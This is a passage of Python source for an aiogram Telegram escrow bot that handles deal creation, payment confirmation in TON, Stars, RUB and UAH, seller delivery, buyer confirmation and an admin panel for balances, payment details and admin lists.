        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None,
        "buyer_message_id": None,
        "buyer_chat_id": None
    }
    save_deals(deals)

    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    text = f"{pm('✅')} {get_text(lang, 'deal_created')} #{deal_id}!\n\n" \
           f"{pm('💰')} {get_text(lang, 'amount')}: {data['amount']} {data['currency']}\n" \
           f"{pm('📦')} {get_text(lang, 'product')}: {data['product']}\n" \
           f"{pm('👤')} {get_text(lang, 'buyer')}: @{buyer_username}\n\n" \
           f"{pm('🔗')} {get_text(lang, 'send_link_to_buyer')}:\n\n" \
           f"{deal_link}\n\n" \
           f"{pm('🔥')} {get_text(lang, 'after_payment_notify')}"
    
    await message.answer(
        text,
        reply_markup=back_to_main_button(message.from_user.id)
    )

    await log_to_master(
        f"🆕 DEAL CREATED\n"
        f"ID: #{deal_id}\n"
        f"Seller: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Buyer: @{buyer_username}\n"
        f"Amount: {data['amount']} {data['currency']}\n"
        f"Product: {data['product']}"
    )
    await state.clear()


# ========== ОПЛАТА ==========
@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
async def pay_by_rekvisits(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    pay_text = get_rekvisits_text(deal["currency"], deal["amount"], callback.from_user.id)

    text = f"{pm('✈️')} {get_text(lang, 'deal')} #{deal_id}\n\n" \
           f"{pm('📦')} {get_text(lang, 'product')}: {deal['product']}\n" \
           f"{pm('💰')} {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n" \
           f"{pm('💳')} {get_text(lang, 'payment_details')}:\n{pay_text}\n\n" \
           f"{pm('🔥')} {get_text(lang, 'payment_verified')}: /pay {deal_id}"
    await safe_edit(callback, text)


@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
async def pay_by_balance(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    buyer_balance = get_balance(callback.from_user.id)
    curr_key = deal["currency"].lower()

    if buyer_balance.get(curr_key, 0) < deal["amount"]:
        await callback.answer(
            f"{pm('❌')} {get_text(lang, 'insufficient_balance')}!\n"
            f"{get_text(lang, 'need')}: {deal['amount']} {deal['currency']}\n"
            f"{get_text(lang, 'available')}: {buyer_balance.get(curr_key, 0)}",
            show_alert=True)
        return

    buyer_balance[curr_key] -= deal["amount"]
    save_balance(balance)

    deal["status"] = "paid"
    deal["paid_by_admin"] = callback.from_user.id
    save_deals(deals)

    text = f"{pm('✅')} {get_text(lang, 'payment_confirmed')}!\n\n" \
           f"{get_text(lang, 'deal')} #{deal_id}\n" \
           f"{pm('💰')} {get_text(lang, 'funds_deducted')}: {deal['amount']} {deal['currency']}\n\n" \
           f"{pm('🔔')} {get_text(lang, 'premium_1')}"
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))

    await send_buyer_pending_message(deal_id)

    seller_lang = get_user_language(deal["seller_id"])
    if seller_lang is None:
        seller_lang = "ru"
        
    text = f"{pm('💎')} {get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}! {pm('💎')}\n\n" \
           f"{pm('💰')} {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('📦')} {get_text(seller_lang, 'product')}: {deal['product']}\n" \
           f"{pm('👤')} {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
           f"{pm('⬇️')} {get_text(seller_lang, 'seller_delivered')} {pm('⬇️')}"
    
    await bot.send_message(
        deal["seller_id"],
        text,
        reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
    )

    await log_to_master(f"💰 Deal #{deal_id} paid from balance by @{callback.from_user.username}")


@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} {get_text(lang, 'admin_rights')}")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} {get_text(lang, 'cmd_usage')}: /pay [ID]\n{get_text(lang, 'example')}: /pay a3f2b1c4")
        return

    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_deals(deals)

    await message.answer(f"{pm('✅')} {get_text(lang, 'payment_confirmed')} {get_text(lang, 'deal')} {deal_id}")

    await send_buyer_pending_message(deal_id)

    seller_lang = get_user_language(deal["seller_id"])
    if seller_lang is None:
        seller_lang = "ru"
        
    text = f"{pm('💎')} {get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}! {pm('💎')}\n\n" \
           f"{pm('💰')} {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('📦')} {get_text(seller_lang, 'product')}: {deal['product']}\n" \
           f"{pm('👤')} {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
           f"{pm('⬇️')} {get_text(seller_lang, 'seller_delivered')} {pm('⬇️')}"
    
    await bot.send_message(
        deal["seller_id"],
        text,
        reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
    )

    await log_to_master(
        f"💸 PAYMENT CONFIRMED\n"
        f"Deal: #{deal_id}\n"
        f"Admin: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Seller: @{deal['seller_username']}\n"
        f"Amount: {deal['amount']} {deal['currency']}"
    )


@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_delivered(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[-1]
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer(f"{pm('❌')} {get_text(lang, 'status_waiting')}")
        return

    deal["status"] = "awaiting_confirmation"
    save_deals(deals)

    text = f"{pm('✅')} {get_text(lang, 'seller_confirmed')}!\n\n" \
           f"{pm('📦')} {get_text(lang, 'product')}: {deal['product']}\n" \
           f"{pm('💰')} {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} {get_text(lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
           f"{pm('⏳')} {get_text(lang, 'status_awaiting')}..."
    await safe_edit(callback, text)

    active_keyboard = buyer_confirm_keyboard(deal_id, deal.get("buyer_id", 0))
    updated = False

    if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
        try:
            await bot.edit_message_reply_markup(
                chat_id=deal["buyer_chat_id"],
                message_id=deal["buyer_message_id"],
                reply_markup=active_keyboard
            )
            updated = True
        except Exception as e:
            print(f"Failed to update keyboard: {e}")

    if not updated:
        buyer_lang = get_user_language(deal.get("buyer_id", 0))
        if buyer_lang is None:
            buyer_lang = "ru"
        text = f"{pm('📦')} {get_text(buyer_lang, 'seller_delivered')} {get_text(buyer_lang, 'deal')} #{deal_id}!\n\n" \
               f"{pm('📦')} {get_text(buyer_lang, 'product')}: {deal['product']}\n" \
               f"{pm('💰')} {get_text(buyer_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
               f"{pm('👤')} {get_text(buyer_lang, 'seller')}: @{deal['seller_username']}\n\n" \
               f"{pm('👍')} {get_text(buyer_lang, 'confirm_receipt')}:"
        try:
            await bot.send_message(
                deal["buyer_username"],
                text,
                reply_markup=active_keyboard
            )
        except:
            if deal.get("buyer_id"):
                try:
                    await bot.send_message(
                        deal["buyer_id"],
                        text,
                        reply_markup=active_keyboard
                    )
                except Exception as e:
                    await callback.message.answer(
                        f"{pm('❗️')} {get_text(lang, 'support_contact')} @{deal['buyer_username']}\n\n"
                        f"{get_text(lang, 'deal_link_text')}:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                    )

    await callback.answer(f"{pm('✅')} {get_text(lang, 'product_delivered')}")


@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm_receipt(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer(f"{pm('❌')} {get_text(lang, 'status_waiting')}")
        return

    add_balance(deal["seller_id"], deal["currency"], deal["amount"])

    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_deals(deals)

    text = f"{pm('✅')} {get_text(lang, 'buyer_confirmed')}!\n\n" \
           f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'status_completed')}.\n" \
           f"{pm('🤝')} {get_text(lang, 'deal_completed_msg')}"
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))

    seller_lang = get_user_language(deal["seller_id"])
    if seller_lang is None:
        seller_lang = "ru"
        
    text = f"{pm('🎁')} {get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_completed')}! {pm('🎁')}\n\n" \
           f"{pm('💰')} {deal['amount']} {deal['currency']} {get_text(seller_lang, 'funds_added_to_balance')}.\n" \
           f"{pm('📦')} {get_text(seller_lang, 'product')}: {deal['product']}\n" \
           f"{pm('👤')} {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
           f"{pm('📊')} {get_text(seller_lang, 'my_balance')}"
    
    await bot.send_message(
        deal["seller_id"],
        text
    )

    await log_to_master(
        f"🎉 DEAL COMPLETED\n"
        f"ID: #{deal_id}\n"
        f"Seller: @{deal['seller_username']} (+{deal['amount']} {deal['currency']})\n"
        f"Buyer: @{deal['buyer_username']}"
    )


# ========== АДМИН-ПАНЕЛЬ ==========
@dp.callback_query(lambda c: c.data == "withdraw_requests")
async def show_withdraw_requests(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return

    pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}

    if not pending:
        text = f"{pm('📭')} {get_text(lang, 'no_active_requests')}"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
    else:
        text = f"{pm('💲')} {get_text(lang, 'withdraw_funds')}\n\n"
        for rid, req in pending.items():
            text += f"#{rid} | {req['amount']} {req['currency']} | @{req['username']}\n"
            text += f"📝 {req['details'][:50]}\n"
            text += f"➡️ /confirm_withdraw {rid}\n\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "change_photo")
async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('📷')} {get_text(lang, 'send_photo')}"
    await safe_edit(callback, text)
    await state.set_state(PhotoStates.waiting_for_photo)


@dp.message(PhotoStates.waiting_for_photo)
async def save_photo_handler(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}")
        await state.clear()
        return

    if message.photo:
        file_id = message.photo[-1].file_id
        start_photo["file_id"] = file_id
        save_start_photo(start_photo)
        await message.answer(f"{pm('✅')} {get_text(lang, 'photo_updated')}",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(f"🖼 Admin {message.from_user.full_name} changed start photo")
    else:
        await message.answer(f"{pm('❌')} {get_text(lang, 'send_photo')}")

    await state.clear()


@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await state.set_state(AdminAddBalanceState.waiting_for_user_id)
    text = f"{pm('💰')} {get_text(lang, 'enter_user_id')}"
    await safe_edit(callback, text)


@dp.message(AdminAddBalanceState.waiting_for_user_id)
async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await state.set_state(AdminAddBalanceState.waiting_for_currency)
        await message.answer(f"{pm('💎')} {get_text(lang, 'choose_currency')}:",
                             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                 [premium_button("TON", "admin_balance_TON", "💎")],
                                 [premium_button("STARS", "admin_balance_STARS", "⭐️")],
                                 [premium_button("RUB", "admin_balance_RUB", "💰")],
                                 [premium_button("UAH", "admin_balance_UAH", "🌐")]
                             ]))
    except ValueError:
        await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")


@dp.callback_query(lambda c: c.data.startswith("admin_balance_"))
async def admin_add_balance_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    currency = callback.data.split("_")[2]
    await state.update_data(target_currency=currency)
    await state.set_state(AdminAddBalanceState.waiting_for_amount)
    text = f"{pm('💰')} {get_text(lang, 'enter_amount')} {currency}:"
    await safe_edit(callback, text)


@dp.message(AdminAddBalanceState.waiting_for_amount)
async def admin_add_balance_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data["target_user_id"]
        currency = data["target_currency"]

        add_balance(user_id, currency, amount)

        await message.answer(f"{pm('✅')} {get_text(lang, 'balance_added')} {amount} {currency}",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(
            f"💰 Admin @{message.from_user.username} added {amount} {currency} to user ID:{user_id}")

        user_lang = get_user_language(user_id)
        if user_lang is None:
            user_lang = "ru"
        try:
            await bot.send_message(
                user_id,
                f"{pm('💰')} {get_text(user_lang, 'balance_topped_up')}!\n\n"
                f"{get_text(user_lang, 'amount')}: {amount} {currency}"
            )
        except:
            pass

        await state.clear()
    except:
        await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")


@dp.callback_query(lambda c: c.data == "edit_rekvisits")
async def edit_rekvisits_panel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
        
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('💳')} {get_text(lang, 'edit_rekvisits_title')}"
    await safe_edit(callback, text, reply_markup=rekvisits_edit_keyboard(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} TON:\n\n{get_text(lang, 'use_amount_placeholder')}"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="ton")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} STARS:\n\n{get_text(lang, 'use_amount_placeholder')}"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="stars")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_rub")
async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} RUB:\n\n{get_text(lang, 'use_amount_placeholder')}"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="rub")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_uah")
async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} UAH:\n\n{get_text(lang, 'use_amount_placeholder')}"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="uah")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.message(RekvStates.waiting_for_rekv_text)
async def save_rekv_text(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    data = await state.get_data()
    rekv_type = data.get("rekv_type")
    if rekv_type:
        rekvisits[rekv_type] = message.text.strip()
        save_rekvisits(rekvisits)
        await message.answer(f"{pm('✅')} {get_text(lang, 'rekvisits_updated')} {rekv_type.upper()}",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(f"💳 Admin {message.from_user.full_name} changed details for {rekv_type.upper()}")
    await state.clear()


@dp.callback_query(lambda c: c.data == "back_to_admin")
async def back_to_admin(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('👑')} {get_text(lang, 'admin_panel')}\n\n{get_text(lang, 'choose_action')}:"
    await safe_edit(callback, text, reply_markup=admin_panel_keyboard(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "add_admin")
async def add_admin_prompt(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('📝')} {get_text(lang, 'enter_user_id')}"
    await safe_edit(callback, text)


@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def add_admin_process(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    user_id = int(message.text.strip())
    admins.add(user_id)
    save_admins(admins)
    await message.answer(f"{pm('✅')} {get_text(lang, 'admin_added')} {user_id}",
                         reply_markup=back_to_main_button(message.from_user.id))
    await log_to_master(f"👑 New admin added: {user_id}")


@dp.callback_query(lambda c: c.data == "remove_admin")
async def remove_admin_prompt(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    text = f"{pm('📝')} {get_text(lang, 'enter_user_id')}"
    await safe_edit(callback, text)


@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def remove_admin_process(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    user_id = int(message.text.strip())
    if user_id == MASTER_ADMIN_ID:
        await message.answer(f"{pm('❌')} {get_text(lang, 'cannot_remove_master')}")
        return
    if user_id in admins:
        admins.remove(user_id)
        save_admins(admins)
        await message.answer(f"{pm('✅')} {get_text(lang, 'admin_removed')} {user_id}",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(f"👑 Admin removed: {user_id}")
    else:
        await message.answer(f"{pm('❌')} {get_text(lang, 'user_not_found')}")


@dp.callback_query(lambda c: c.data == "list_admins")
async def list_admins_callback(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in admins])
    text = f"{pm('📊')} {get_text(lang, 'admin_list')}:\n\n{admin_list}"
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "all_deals")
async def all_deals_callback(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
        return
    if not deals:
        text = f"{pm('📭')} {get_text(lang, 'no_deals_total')}"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
    else:
        text = f"{pm('📊')} {get_text(lang, 'all_deals_title')}\n\n"
        for deal_id, deal in list(deals.items())[-20:]:
            status_emoji = {"waiting_payment": pm('⏳'), "paid": pm('✅'), "awaiting_confirmation": pm('📦'),
                            "completed": pm('🎁')}.get(deal['status'], pm('❓'))
            text += f"{deal_id} | {status_emoji} | {deal['amount']} {deal['currency']}\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "noop")
async def noop_callback(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    await callback.answer(f"{pm('⏳')} {get_text(lang, 'waiting_for_delivery')}")


@dp.callback_query(lambda c: c.data.startswith("support_"))
async def support_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[1]
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    await callback.answer()
    await callback.message.answer(
        f"{pm('💬')} {get_text(lang, 'support_contact')}: {get_text(lang, 'support_contact')}"
    )


# ========== ЗАПУСК ==========
async def main():
    print(f"{pm('🚀')} {BOT_NAME} STARTED")
    print(f"{pm('👑')} MASTER ADMIN: {MASTER_ADMIN_ID}")
    print(f"{pm('📊')} TOTAL ADMINS: {len(admins)}")
    print(f"{pm('🤖')} BOT: @{BOT_USERNAME}")
    print(f"{pm('💎')} SUPPORTED CURRENCIES: TON, STARS, RUB, UAH")
    print(f"{pm('🌐')} SUPPORTED LANGUAGES: Russian, English, Chinese, Arabic")
    print(f"{pm('✅')} PREMIUM EMOJIS LOADED")
    print(f"{pm('🆘')} SUPPORT: {SUPPORT_LINK}")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
